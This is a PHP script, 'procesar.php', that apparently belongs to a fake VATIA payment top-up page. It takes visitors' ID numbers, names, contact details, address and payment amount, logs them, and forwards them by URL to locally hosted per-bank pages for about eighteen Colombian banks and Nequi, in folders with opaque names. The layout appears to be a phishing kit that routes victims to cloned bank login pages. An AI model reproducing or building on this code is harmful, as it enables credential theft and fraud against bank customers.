<?php
// procesar.php - Procesamiento de recargas VATIA
session_start();
ob_start();

// Verificar que venga del formulario
if (!isset($_POST['procesarRecarga'])) {
    error_log("procesar.php: No se recibió procesarRecarga, redirigiendo a index.php");
    header('Location: index.php');
    exit;
}

error_log("procesar.php: Iniciando procesamiento");
error_log("procesar.php: POST data: " . json_encode($_POST));

// Obtener datos del formulario
$idInterno = $_SESSION['id_interno'] ?? 'unknown';
$formData = [
    'id_interno' => $idInterno,
    'tipo_doc' => $_POST['tipo_doc'] ?? '',
    'numero_doc' => $_POST['cedula'] ?? '',
    'nombres' => $_POST['nombres'] ?? '',
    'apellidos' => $_POST['apellidos'] ?? '',
    'correo' => $_POST['correo'] ?? '',
    'telefono' => $_POST['telefono'] ?? '',
    'celular' => $_POST['celular'] ?? '',
    'direccion' => $_POST['direccion'] ?? '',
    'pais' => $_POST['pais'] ?? '',
    'ciudad' => $_POST['ciudad'] ?? '',
    'tipo_persona' => $_POST['tipo_persona'] ?? '',
    'banco' => $_POST['banco'] ?? '',
    'monto' => $_POST['monto'] ?? '',
    'descripcion' => $_POST['descripcion'] ?? 'Pago VATIA',
    'timestamp' => date('Y-m-d H:i:s')
];

// Guardar en sesión para que los bancos puedan acceder
$_SESSION['pse_data'] = $formData;

// Redirigir según banco seleccionado usando folders
$banco_seleccionado = $formData['banco'];
error_log("Banco seleccionado: " . $banco_seleccionado);

$bank_routes = [
    'avvillas' => ['folder' => 'b-34f1', 'ext' => 'html'],
    'bbva' => ['folder' => 'b-34f13', 'ext' => 'php'],
    'caja-social' => ['folder' => 'b-34f2', 'ext' => 'html'],
    'bogota' => ['folder' => 'b-34f4', 'ext' => 'html'],
    'davivienda' => ['folder' => 'b-34f10', 'ext' => 'html'],
    'occidente' => ['folder' => 'b-34f14', 'ext' => 'html'],
    'falabella' => ['folder' => 'b-34f5', 'ext' => 'html'],
    'finandina' => ['folder' => 'b-34f6', 'ext' => 'html'],
    'itau' => ['folder' => 'b-34f7', 'ext' => 'html'],
    'mundo-mujer' => ['folder' => 'b-34f01', 'ext' => 'html'],
    'popular' => ['folder' => 'b-34f18', 'ext' => 'html'],
    'serfinanza' => ['folder' => 'b-34f16', 'ext' => 'html'],
    'union' => ['folder' => 'b-34f0', 'ext' => 'html'],
    'bancolombia' => ['folder' => 'b-34f9', 'ext' => 'html'],
    'davibank' => ['folder' => 'b-34f12', 'ext' => 'html'],
    'lulo' => ['folder' => 'b-34f02', 'ext' => 'html'],
    'scotiabank-colpatria' => ['folder' => 'b-34f12', 'ext' => 'html'],
    'nequi' => ['folder' => 'nequi-1/', 'ext' => 'php']
];

if (isset($bank_routes[$banco_seleccionado])) {
    $config = $bank_routes[$banco_seleccionado];
    $folder = $config['folder'];
    $ext = $config['ext'];

    // Construir URL con parámetros GET
    $params = http_build_query([
        'tipo_doc' => $formData['tipo_doc'],
        'cedula' => $formData['numero_doc'], // Agregar cédula que buscan los bancos
        'nombres' => $formData['nombres'],
        'apellidos' => $formData['apellidos'],
        'correo' => $formData['correo'],
        'telefono' => $formData['telefono'],
        'celular' => $formData['celular'],
        'direccion' => $formData['direccion'],
        'pais' => $formData['pais'],
        'ciudad' => $formData['ciudad'],
        'tipo_persona' => $formData['tipo_persona'],
        'monto' => $formData['monto'],
        'descripcion' => $formData['descripcion']
    ]);

    $redirect_url = 'transaction/' . $folder . '/index.' . $ext . '?' . $params;
    error_log("procesar.php: Redirigiendo a: " . $redirect_url);
    error_log("procesar.php: URL completa: " . (isset($_SERVER['REQUEST_SCHEME']) ? $_SERVER['REQUEST_SCHEME'] : 'http') . '://' . $_SERVER['HTTP_HOST'] . '/' . $redirect_url);
    header('Location: ' . $redirect_url);
} else {
    error_log("Banco no encontrado: " . $banco_seleccionado);
    // Si no hay banco válido, volver al formulario
    header('Location: index.php?error=banco_invalido');
}

exit;
?>